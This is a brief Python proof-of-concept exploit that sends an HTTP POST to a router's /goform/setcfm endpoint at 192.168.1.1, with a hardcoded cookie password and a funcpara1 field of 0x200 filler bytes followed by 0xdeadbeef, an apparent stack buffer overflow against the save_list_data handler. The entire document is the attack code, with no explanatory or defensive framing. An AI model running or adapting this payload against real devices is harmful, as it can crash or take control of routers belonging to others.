import requests
def send_payload(url, funcpara1, funcpara2):
    params={
            'funcname':b'save_list_data',
            'funcpara1':funcpara1,
            'funcpara2':funcpara2}
    cookie={'password':'gfytgb'}
    response = requests.post(url,cookies=cookie,data=params)
    print(f"Status Code: {response.status_code}")
    print(f"Response Text: {response.text}")

funcname=b'save_list_data'
funcpara1=b'a'*0x200+b'\xef\xbe\xad\xde'
funcpara2=b''
url="http://192.168.1.1/goform/setcfm"
send_payload(url, funcpara1,funcpara2)   